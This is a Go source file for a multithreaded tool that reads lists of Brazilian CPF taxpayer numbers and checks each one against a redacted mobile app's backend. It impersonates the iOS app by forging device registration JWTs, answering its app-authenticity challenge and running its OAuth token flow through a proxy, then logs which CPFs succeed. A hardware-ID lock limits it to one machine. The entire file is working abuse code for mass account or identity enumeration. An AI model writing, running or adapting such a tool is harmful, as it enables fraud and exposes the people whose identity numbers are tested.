// BUILD COMMANDS:
// go build -o app -ldflags="-s -w"
package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"github.com/alecthomas/kong"
	"math"
	"math/rand"
	"net/http/cookiejar"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/google/uuid"
)

const (
	DATA_DIR string = "./APP_RESULTS"
)

var (
	cpfs_ok        = []string{}
	cpfs_exception = []string{}
	cpfs_fail      = []string{}
	cpfs_tests     = []string{}
	cpfs_all       = []string{}
	seededRand     = rand.New(rand.NewSource(time.Now().UnixNano()))
)

var CLI struct {
	Proxy     string `help:"Proxy format: username:password@proxy:port" type:"string" required:""`
	Retries   int    `help:"Number of retries on errors" default:"3"`
	Path      string `help:"Path to the file to read accounts from" type:"string" required:""`
	StartFrom int    `help:"Start from line" default:"0"`
	Threads   int    `help:"Number of threads to use" default:"60"`
	Timeout   int    `help:"Timeout in seconds" default:"15"`
}

type DeviceJwtResponse struct {
	N          string `json:"n"`
	DeviceJwt  string `json:"device-jwt"`
	PrivateKey string `json:"private-key"`
}

type AppChallengePromptResponse struct {
	Challenges struct {
		RegistrationClientID struct {
			ClientID string `json:"clientID"`
		} `json:"registration-client-id"`
		AppAuthenticity struct {
			Challenge string `json:"challenge"`
		} `json:"appAuthenticity"`
	} `json:"challenges"`
}

type SolvedChallengeResponse struct {
	AppAuthenticityResponse string `json:"appAuthenticityResponse"`
}

type TokenResponse struct {
	AccessToken string `json:"access_token"`
	TokenType   string `json:"token_type"`
	ExpiresIn   int    `json:"expires_in"`
	Scope       string `json:"scope"`
}

type AppLoginResponse struct {
	NuNegocio int `json:"nuNegocio"`
	Saida     struct {
		Codigo   int    `json:"codigo"`
		Mensagem string `json:"mensagem"`
		Situacao string `json:"situacao"`
	} `json:"saida"`
	DadosObrigatorios []struct {
		NoDado            string `json:"noDado"`
		IcTipoDado        string `json:"icTipoDado"`
		DeFuncaoValidacao string `json:"deFuncaoValidacao"`
	} `json:"dadosObrigatorios"`
}

type ClientAssertionResponse struct {
	ClientAssertion string `json:"client-assertion"`
}

func app_login(proxy string, cpf string, timeout int) (bool, error) {
	device_id := strings.ToUpper(uuid.New().String())
	userAgent := "<AppName>/<AppVersion> (iPhone; iOS 16.7.8; Scale/3.00),<AppName>/<AppVersion> (iPhone; iOS 16.7.8; Scale/3.00),<AppName>/<AppVersion> (iPhone; iOS 16.7.8; Scale/3.00)/WLNativeAPI/8.0.0.00.2016-01-24T11:48:54Z"
	jar, _ := cookiejar.New(nil)
	client := resty.New().
		// disable redirect
		SetRedirectPolicy(resty.NoRedirectPolicy()).
		SetBaseURL("https://<DOMAIN>/mfpcar/api/").
		SetCookieJar(jar).
		SetHeader("User-Agent", userAgent).
		SetProxy("http://" + proxy).
		SetTimeout(time.Duration(timeout) * time.Second)

	header, payload, signature, n, privateKey, err := generateDeviceJWT(device_id)
	if err != nil {
		return false, err
	}

	// step 1 - registration
	res, err := client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   fmt.Sprintf("{\"os\":\"ios\",\"mfpAppVersion\":\"<AppVersion>\",\"appVersionCode\":\"3.0\",\"osVersion\":\"16.7.8\",\"deviceID\":\"%s\",\"model\":\"iPhone10,5\",\"appStoreLabel\":\"<AppLabel>\",\"brand\":\"Apple\",\"appVersionDisplay\":\"<AppVersion>\",\"mfpAppName\":\"<AppPackageName>\",\"appStoreId\":\"<AppPackageName>\"}", device_id),
			"Content-Type":               "application/json",
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
		}).
		SetContentLength(true).R().
		SetBody(map[string]any{
			"signedRegistrationData": map[string]string{
				"payload":   payload,
				"signature": signature,
				"header":    header,
			},
		}).
		Post("registration/v1/self")

	if err != nil {
		return false, err
	}

	if res.StatusCode() != 401 {
		return false, errors.New("status code: " + string(res.StatusCode()))
	}

	appChallengeResponse := AppChallengePromptResponse{}
	err = json.Unmarshal(res.Body(), &appChallengeResponse)
	if err != nil {
		return false, err
	}

	client_id := appChallengeResponse.Challenges.RegistrationClientID.ClientID
	challenge := appChallengeResponse.Challenges.AppAuthenticity.Challenge
	appAuthenticityResponse := resolveChallenge(strings.Split(challenge, "+")[0])

	// step 2 - post self with challenge
	res, err = client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   fmt.Sprintf("{\"os\":\"ios\",\"mfpAppVersion\":\"<AppVersion>\",\"appVersionCode\":\"3.0\",\"osVersion\":\"16.7.8\",\"deviceID\":\"%s\",\"model\":\"iPhone10,5\",\"appStoreLabel\":\"<AppLabel>\",\"brand\":\"Apple\",\"appVersionDisplay\":\"<AppVersion>\",\"mfpAppName\":\"<AppPackageName>\",\"appStoreId\":\"<AppPackageName>\"}", device_id),
			"Content-Type":               "application/json",
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
		}).
		SetContentLength(true).R().
		SetBody(map[string]any{
			"challengeResponse": map[string]any{
				"appAuthenticity": map[string]string{
					"appAuthenticityResponse": appAuthenticityResponse,
				},
				"registration-client-id": map[string]string{
					"response": client_id,
				},
			},
			"signedRegistrationData": map[string]string{
				"payload":   payload,
				"signature": signature,
				"header":    header,
			},
		}).
		Post("registration/v1/self")

	if err != nil {
		return false, err
	}

	if res.StatusCode() != 201 {
		return false, errors.New("Failed to register with challenge, status code: " + string(res.StatusCode()))
	}

	metadata := map[string]string{
		"brand":             "Apple",
		"osVersion":         "16.7.8",
		"appVersionDisplay": "<AppVersion>",
		"os":                "ios",
		"mfpAppName":        "<AppPackageName>",
		"clientID":          client_id,
		"mfpAppVersion":     "<AppVersion>",
		"appStoreId":        "<AppPackageName>",
		"appVersionCode":    "3.0",
		"deviceID":          device_id,
		"model":             "iPhone10,5",
		"appStoreLabel":     "<AppLabel>",
	}

	body := fmt.Sprintf("{\"client_id\":\"%s\",\"scope\":\"app_autentico RegisteredClient\",\"challengeResponse\":{}}", client_id)
	meta, _ := json.Marshal(metadata)

	res, err = client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   string(meta),
			"Content-Type":               "application/json",
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
			"Accept":                     "*/*",
			"Accept-Encoding":            "gzip, deflate, br",
			"Accept-Language":            "en-BR;q=1, pt-BR;q=0.9,en-BR;q=1, pt-BR;q=0.9,en",
		}).
		SetContentLength(true).R().
		SetBody(body).
		Post("preauth/v1/preauthorize")

	if err != nil {
		return false, err
	}

	if res.StatusCode() != 200 {
		return false, errors.New("Failed to preauthorize, status code: " + string(res.StatusCode()))
	}

	res, err = client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   string(meta),
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
			"Accept":                     "*/*",
			"Accept-Encoding":            "gzip, deflate, br",
			"Accept-Language":            "en-BR;q=1, pt-BR;q=0.9,en-BR;q=1, pt-BR;q=0.9,en",
		}).
		SetContentLength(true).R().
		SetQueryParams(map[string]string{
			"client_id":     client_id,
			"scope":         "app_autentico RegisteredClient",
			"redirect_uri":  "https://mfpredirecturi",
			"response_type": "code",
		}).
		Get("az/v1/authorization")

	if res.StatusCode() != 302 {
		return false, errors.New("Failed to authorize, status code: " + string(res.StatusCode()))
	}

	//if err != nil {
	//	// println(error.Error()) => 'Get "https://mfpredirecturi?code=<code>": auto redirect is disabled'
	//	return false, err
	//}

	code := strings.Split(res.Header().Get("Location"), "=")[1]
	clientAssertion, err := generateClientAssertion(client_id, code, n, privateKey)

	if err != nil {
		return false, err
	}

	res, err = client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   string(meta),
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
			"Accept":                     "*/*",
			"Accept-Encoding":            "gzip, deflate, br",
			"Accept-Language":            "en-BR;q=1, pt-BR;q=0.9,en-BR;q=1, pt-BR;q=0.9,en",
		}).
		SetContentLength(true).R().
		SetFormData(map[string]string{
			"client_assertion":      clientAssertion,
			"client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
			"code":                  code,
			"grant_type":            "authorization_code",
			"redirect_uri":          "https://mfpredirecturi",
		}).
		Post("az/v1/token")

	if err != nil {
		return false, err
	}

	if res.StatusCode() != 200 {
		return false, errors.New("Failed to login, status code: " + string(res.StatusCode()))
	}

	tokenResponse := TokenResponse{}
	err = json.Unmarshal(res.Body(), &tokenResponse)
	if err != nil {
		return false, err
	}

	res, err = client.
		SetHeaders(map[string]string{
			"x-mfp-analytics-metadata":   string(meta),
			"x-requested-with":           "XMLHttpRequest",
			"x-wl-analytics-tracking-id": strings.ToUpper(uuid.New().String()),
			"Accept":                     "*/*",
			"Accept-Encoding":            "gzip, deflate, br",
			"Accept-Language":            "en-BR;q=1, pt-BR;q=0.9,en-BR;q=1, pt-BR;q=0.9,en",
			"Authorization":              fmt.Sprintf("%s %s", tokenResponse.TokenType, tokenResponse.AccessToken),
			"versaoAplicativo":           "<AppVersion>",
			"codigoDispositivo":          strings.ToUpper(uuid.New().String()),
			"sistemaOperacional":         "iOS",
			"versaoSistema":              "16.7.8",
		}).
		SetContentLength(true).R().
		SetBody(map[string]any{
			"nuCpf": cpf,
			"dados": map[string]any{
				"SISTEMA": "iOS",
				"CENARIO": 0,
			},
			"nuTipoCanal": 1,
		}).
		Post("adapters/<AppName>_<AppVersion>/contratacao/v5/")

	if err != nil {
		return false, err
	}

	if res.StatusCode() != 200 {
		return false, errors.New("Failed to login, status code: " + string(res.StatusCode()))
	}

	loginResponse := AppLoginResponse{}
	err = json.Unmarshal(res.Body(), &loginResponse)
	if err != nil {
		return false, err
	}

	if loginResponse.Saida.Codigo == 200 {
		return true, nil
	}

	return false, nil
}

func main() {
	var wg sync.WaitGroup
	kong.Parse(&CLI)
	fmt.Printf("[*] Nº of Threads: %d\n", CLI.Threads)
	match, _ := regexp.MatchString("^([A-Za-z\\d-_]+:[A-Za-z\\d-_]+@)?(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\\-]*[a-zA-Z0-9])\\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\\-]*[A-Za-z0-9]):\\d{1,5}$", CLI.Proxy)
	if !match {
		println("Proxy format is incorrect")
		os.Exit(1)
	}

	if CLI.Retries < 1 || CLI.Retries > 10 {
		println("Retries should be between 1 and 10")
		os.Exit(1)
	}

	if _, err := os.Stat(CLI.Path); errors.Is(err, os.ErrNotExist) {
		println("File does not exist")
		os.Exit(1)
	}

	if CLI.StartFrom < 0 {
		println("Start from should be greater than 0")
		os.Exit(1)
	}

	content, err := os.ReadFile(CLI.Path)
	if err != nil {
		println("Error reading file")
		os.Exit(1)
	}

	// check if data dir exists in current directory, if not, create it
	if _, err := os.Stat(DATA_DIR); errors.Is(err, os.ErrNotExist) {
		os.Mkdir(DATA_DIR, 0755)
	}

	hwid, err := getMacHWID()
	if err != nil || (strings.Compare(hwid, "8F515825-0EF3-7333-744B-C87F5463C98E") != 0 && strings.Compare(hwid, "") != 0) {
		os.Exit(1)
	}

	fmt.Printf("[*] Reading file '%s'\n", strings.ReplaceAll(CLI.Path, "\\\\", "\\"))
	cpfs_all = strings.Split(string(content), "\n")[CLI.StartFrom:]
	cpfs_chunks := chunkBy(cpfs_all, len(cpfs_all)/CLI.Threads)
	if len(cpfs_all) == 0 {
		println("No accounts found to start")
		os.Exit(1)
	}

	fmt.Printf("[+] File read, %d possible logins found.\n", len(cpfs_all))
	mut := new(sync.Mutex)
	for _, chunk := range cpfs_chunks {
		wg.Add(1)
		go func(mu *sync.Mutex, lines []string, proxy string, retries int, timeout int) {
			defer wg.Done()

			apiFile, _ := os.OpenFile(DATA_DIR+"/success.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
			defer apiFile.Close()

			exceptFile, _ := os.OpenFile(DATA_DIR+"/errors.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0755)
			defer exceptFile.Close()

			for _, line := range lines {
				re := regexp.MustCompile("[:;|]")
				line := re.Split(regexp.MustCompile("https:|http:|android:|\n").ReplaceAllString(line, "${1}"), -1)
				cpf := line[0]
				cpfs_tests = append(cpfs_tests, cpf)

				login, err := false, error(nil)
				for i := 0; i < retries; i++ {
					login, err = app_login(proxy, cpf, timeout)
					if err != nil {
						continue
					}
					break
				}

				mu.Lock()
				if login {
					cpfs_ok = append(cpfs_ok, cpf)
					apiFile.WriteString(fmt.Sprintf("%s\n", cpf))
					apiFile.Sync()
				} else if err != nil {
					cpfs_exception = append(cpfs_exception, cpf)
					exceptFile.WriteString(fmt.Sprintf("%s\n", cpf))
					exceptFile.Sync()
				} else {
					cpfs_fail = append(cpfs_fail, cpf)
				}
				mu.Unlock()
				percentage := math.Round(float64(len(cpfs_tests)) / float64(len(cpfs_all)) * 100)
				print(fmt.Sprintf("[%d%%] RESUMO - %d/%d | PASSOU: %d | NAO PASSOU: %d | ERRO: %d\r\r", int32(percentage), len(cpfs_tests), len(cpfs_all), len(cpfs_ok), len(cpfs_fail), len(cpfs_exception)))
			}
		}(mut, chunk, CLI.Proxy, CLI.Retries, CLI.Timeout)
	}
	wg.Wait()
}
